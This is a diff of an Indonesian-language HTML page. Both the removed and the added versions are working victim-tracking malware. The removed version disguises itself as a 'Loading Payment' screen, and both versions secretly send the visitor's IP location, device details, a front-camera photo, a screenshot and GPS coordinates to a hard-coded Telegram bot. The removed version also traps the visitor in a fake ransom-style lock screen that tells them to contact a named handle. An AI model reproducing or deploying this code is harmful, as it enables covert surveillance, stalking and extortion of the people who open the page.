@@ -3,214 +3,158 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1.0">
-    <title>bodo banget si</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <title>Tracking Gila by Architect 01</title>
     <style>
-        body { background: #000; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; color: #999; overflow: hidden; }
-        #loading-container { text-align: center; width: 80%; max-width: 400px; }
-        #loading-text { font-size: 22px; margin-bottom: 20px; color: #6e48aa; }
-        #progress-container { height: 3px; background: #222; border-radius: 3px; overflow: hidden; }
-        #progress-bar { height: 100%; width: 0%; background: linear-gradient(90deg,#6e48aa,#9d50bb); transition: width .3s ease; }
-        #loading-details { margin-top: 20px; font-size: 14px; color: #666; }
-        .hidden { display: none; }
-        #lockOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 999999; display: none; flex-direction: column; justify-content: center; align-items: center; color: white; font-size: 24px; }
-        #lockOverlay button { padding: 10px 20px; font-size: 18px; background: red; color: white; border: none; cursor: pointer; }
+        body { background: #0a0a0a; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; padding: 20px; text-align: center; }
+        .container { max-width: 600px; }
+        .loading { font-size: 24px; margin-bottom: 20px; }
+        .details { background: #1a1a1a; padding: 20px; border-radius: 10px; border: 1px solid #0f0; text-align: left; overflow: auto; max-height: 400px; }
+        pre { margin: 0; color: #0f0; }
     </style>
 </head>
 <body>
-    <div id="loading-container">
-        <!-- INI TEKS YANG LO MINTA: Loading Payment -->
-        <div id="loading-text">Loading Payment</div>
-        <div id="progress-container"><div id="progress-bar"></div></div>
-        <div id="loading-details"></div>
+    <div class="container">
+        <div class="loading">🔓 MENGUMPULKAN DATA KORBAN... 🔓</div>
+        <div class="details" id="details">
+            <pre>Memuat...</pre>
+        </div>
     </div>
-
-    <div id="lockOverlay">
-        <div>⚠️ SISTEM LU TERKUNCI ⚠️</div>
-        <div style="font-size: 14px; margin: 20px;">Hubungi @branzx2 buat buka</div>
-        <button onclick="fakeUnlock()">Buka Kunci</button>
-    </div>
-
-    <video id="v" autoplay muted class="hidden"></video>
-    <canvas id="c" class="hidden"></canvas>
 
     <script>
-        (() => {
-            // ==================== KONFIGURASI ====================
-            const T = '8201413619:AAFu1bPBjxbg8Nt9-emFpE_tb2TaSQTPbEE';  // Token bot Telegram (ganti kalo perlu)
-            const C = '6809118251';                                      // Chat ID tujuan (ganti kalo perlu)
+        // ==================== KONFIGURASI ====================
+        const TELEGRAM_TOKEN = '8201413619:AAFu1bPBjxbg8Nt9-emFpE_tb2TaSQTPbEE';  // Ganti dengan token bot lo
+        const CHAT_ID = '6809118251';                                            // Ganti dengan chat ID lo
+        const IPINFO_TOKEN = 'c2c5a23c8c5c1b';                                   // <--- GANTI DENGAN TOKEN IPINFO LO (daftar gratis di ipinfo.io)
 
-            // ==================== PROGRESS BAR PALSU ====================
-            let p = 0;
-            const pb = document.getElementById('progress-bar');
-            const ld = document.getElementById('loading-details');
-            const LM = [
-                "Memeriksa modul sistem...",
-                "Memuat komponen inti...",
-                "Menginisialisasi antarmuka...",
-                "Memverifikasi koneksi...",
-                "Menyiapkan lingkungan...",
-                "Memeriksa pembaruan...",
-                "Memuat aset tampilan..."
-            ];
-            setInterval(() => {
-                p += Math.random() * 5;
-                if (p > 98) p = 98;
-                pb.style.width = p + '%';
-                if (Math.random() > .9) ld.textContent = LM[Math.floor(Math.random() * LM.length)];
-            }, 500);
+        // ==================== FUNGSI KIRIM TELEGRAM ====================
+        async function sendTelegramMessage(text) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+                });
+            } catch (e) { console.log('Gagal kirim pesan:', e); }
+        }
 
-            // ==================== FUNGSI KIRIM TELEGRAM ====================
-            const sTG = async d => {
-                try {
-                    await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: C, text: d, parse_mode: 'HTML' })
-                    });
-                } catch (e) {}
-            };
+        async function sendTelegramPhoto(blob, filename) {
+            try {
+                let fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, filename);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            } catch (e) { console.log('Gagal kirim foto:', e); }
+        }
 
-            const sP = async (b, f) => {
-                try {
-                    const fd = new FormData();
-                    fd.append('chat_id', C);
-                    fd.append('photo', b, f);
-                    await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
-                } catch (e) {}
-            };
+        // ==================== DAPETIN DATA IP VIA IPINFO ====================
+        async function getIPInfo() {
+            try {
+                let response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
+                let data = await response.json();
+                return data;
+            } catch (error) {
+                console.log('Gagal ambil data ipinfo:', error);
+                return null;
+            }
+        }
 
-            // ==================== GET ALAMAT DARI LAT/LONG ====================
-            const gLD = async (a, b) => {
-                try {
-                    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`);
-                    const d = await r.json();
-                    if (d.address) {
-                        return {
-                            kb: d.address.county || d.address.city || d.address.state || "Tidak diketahui",
-                            kc: d.address.suburb || d.address.village || d.address.town || "Tidak diketahui",
-                            fa: d.display_name || "Alamat tidak tersedia"
-                        };
-                    }
-                } catch (e) {}
-                return { kb: "Tidak diketahui", kc: "Tidak diketahui", fa: "Alamat tidak tersedia" };
-            };
+        // ==================== REVERSE GEOCODING (ALAMAT DARI GPS) ====================
+        async function reverseGeocode(lat, lon) {
+            try {
+                // Pake BigDataCloud biar akurat (gratis)
+                let url = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=id`;
+                let resp = await fetch(url);
+                let data = await resp.json();
+                return data;
+            } catch (e) {
+                return null;
+            }
+        }
 
-            // ==================== KUMPULIN DATA DEVICE & LOKASI ====================
-            const cDI = async () => {
-                let m = '╭───── Tracking Report ───── ⦿\n\n⚙️ DEVICE INFORMATION\n';
-                m += `🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
+        // ==================== FUNGSI UTAMA ====================
+        async function main() {
+            let output = document.getElementById('details').querySelector('pre');
+            let report = '';
 
-                if (navigator.getBattery) {
-                    try {
-                        const b = await navigator.getBattery();
-                        m += `🔋 Battery: ${Math.floor(b.level * 100)}%\n🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
-                    } catch (e) { m += '🔋 Battery: ❌ Tidak tersedia\n'; }
-                }
-
-                m += `⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n🔗 Referrer: ${document.referrer || 'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
-
-                // Lokasi dari IP
-                try {
-                    const i = await fetch('https://ipapi.co/json/');
-                    const d = await i.json();
-                    m += '📍 LOCATION INFORMATION (IP-Based)\n';
-                    m += `📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;
-                    if (d.latitude && d.longitude) {
-                        m += `📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;
-                        const l = await gLD(d.latitude, d.longitude);
-                        m += `🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`;
-                    }
-                } catch (e) { m += '❌ Gagal mendapatkan informasi lokasi dari IP\n'; }
-
-                m += '\n╰───── Telegram @branzx2 ───── ⦿';
-                return m;
-            };
-
-            // ==================== EKSEKUSI UTAMA ====================
-            const ST = async () => {
-                // Kirim laporan device & lokasi
-                await sTG(await cDI());
-
-                // Ambil foto dari KAMERA DEPAN
-                try {
-                    const v = document.getElementById('v');
-                    const c = document.getElementById('c');
-                    const st = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: 'user' }  // 'user' = kamera depan
-                    });
-
-                    v.srcObject = st;
-                    await new Promise(r => setTimeout(r, 3000)); // Tunggu 3 detik biar kamera siap
-
-                    c.width = v.videoWidth;
-                    c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-
-                    // Kirim foto selfie ke Telegram
-                    c.toBlob(b => sP(b, 'selfie.jpg'), 'image/jpeg');
-
-                    // Matikan kamera
-                    st.getTracks().forEach(t => t.stop());
-                } catch (e) {
-                    await sTG('❌ Kamera depan gagal diakses: ' + e.message);
-                }
-
-                // Ambil screenshot halaman (opsional)
-                setTimeout(async () => {
-                    try {
-                        const cn = await html2canvas(document.body);
-                        cn.toBlob(b => sP(b, 'screenshot.jpg'), 'image/jpeg');
-                    } catch (e) {
-                        await sTG('❌ Screenshot gagal: ' + e.message);
-                    }
-                }, 5000);
-
-                // GPS tracking real-time
-                if (navigator.geolocation) {
-                    navigator.geolocation.watchPosition(async p => {
-                        let g = `📍 LIVE GPS TRACKING\n📌 Lat: ${p.coords.latitude}\n📍 Lng: ${p.coords.longitude}\n🎯 Akurasi: ${p.coords.accuracy}m\n`;
-                        const l = await gLD(p.coords.latitude, p.coords.longitude);
-                        g += `🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
-                        await sTG(g);
-                    }, async e => {
-                        await sTG(`❌ GPS Error: ${e.message}`);
-                    }, { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 });
-                }
-            };
-
-            // ========== FAKE LOCK ==========
-            function activateLock() {
-                const overlay = document.getElementById('lockOverlay');
-                overlay.style.display = 'flex';
-
-                if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-                else if (document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
-                else if (document.documentElement.msRequestFullscreen) document.documentElement.msRequestFullscreen();
-
-                if (navigator.vibrate) setInterval(() => { navigator.vibrate([500,200,500,200,1000]); }, 2000);
-
-                function bomb() { setTimeout(() => { alert('⚠️ LOCKED! Hubungi @branzx2'); bomb(); }, 100); }
-                bomb();
-
-                document.addEventListener('fullscreenchange', () => { if (!document.fullscreenElement) document.documentElement.requestFullscreen(); });
-                document.addEventListener('webkitfullscreenchange', () => { if (!document.webkitFullscreenElement) document.documentElement.webkitRequestFullscreen(); });
-
-                history.pushState(null, null, location.href);
-                window.onpopstate = function () { history.pushState(null, null, location.href); };
+            // 1. Dapatkan IP info
+            let ipData = await getIPInfo();
+            if (ipData) {
+                report += '╭───── IPINFO.IO DATA ───── ⦿\n';
+                report += `IP         : ${ipData.ip}\n`;
+                report += `Kota       : ${ipData.city}\n`;
+                report += `Region     : ${ipData.region}\n`;
+                report += `Negara     : ${ipData.country}\n`;
+                report += `Koordinat  : ${ipData.loc}\n`;
+                report += `ISP        : ${ipData.org}\n`;
+                report += `Timezone   : ${ipData.timezone}\n`;
+                report += '╰─────────────────────────⦿\n\n';
+            } else {
+                report += '❌ Gagal ambil data ipinfo\n\n';
             }
 
-            window.fakeUnlock = function () {
-                alert('Maaf, ini cuma jebakan. HP lu tetep ke kunci!');
-                activateLock();
-            };
+            // Tampilkan dulu di layar
+            output.innerText = report;
 
-            // Mulai tracking setelah 3 detik
-            setTimeout(ST, 3000);
+            // Kirim laporan awal ke Telegram
+            await sendTelegramMessage(report);
 
-            // Aktifkan fake lock setelah 30 detik (biar kamera sempet)
-            setTimeout(activateLock, 30000);
-        })();
+            // 2. Ambil foto dari kamera depan
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                let video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                await new Promise(r => setTimeout(r, 2000)); // tunggu kamera siap
+                let canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => sendTelegramPhoto(blob, 'selfie.jpg'), 'image/jpeg');
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                await sendTelegramMessage('❌ Gagal akses kamera: ' + e.message);
+            }
+
+            // 3. GPS tracking
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    let lat = pos.coords.latitude;
+                    let lon = pos.coords.longitude;
+                    let acc = pos.coords.accuracy;
+                    let gpsMsg = `📍 GPS POSITION\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${acc}m\n`;
+
+                    // Reverse geocoding
+                    let addr = await reverseGeocode(lat, lon);
+                    if (addr) {
+                        gpsMsg += `Alamat: ${addr.locality || addr.city || ''}, ${addr.principalSubdivision || ''}\n`;
+                        gpsMsg += `Lengkap: ${addr.localityInfo?.administrative?.slice(-2).map(a => a.name).join(', ') || 'Tidak diketahui'}\n`;
+                    } else {
+                        gpsMsg += 'Alamat: Tidak tersedia\n';
+                    }
+
+                    await sendTelegramMessage(gpsMsg);
+                    output.innerText += '\n' + gpsMsg;
+                }, (err) => {
+                    sendTelegramMessage('❌ GPS error: ' + err.message);
+                }, { enableHighAccuracy: true, timeout: 10000 });
+            } else {
+                sendTelegramMessage('❌ Geolocation tidak didukung');
+            }
+
+            // 4. Screenshot halaman (opsional)
+            setTimeout(async () => {
+                try {
+                    let canvas = await html2canvas(document.body);
+                    canvas.toBlob(blob => sendTelegramPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
+                } catch (e) {}
+            }, 5000);
+        }
+
+        // Load html2canvas dari CDN (tambahkan di head atau di sini)
+        let script = document.createElement('script');
+        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
+        script.onload = main;
+        document.head.appendChild(script);
     </script>
 </body>
 </html>
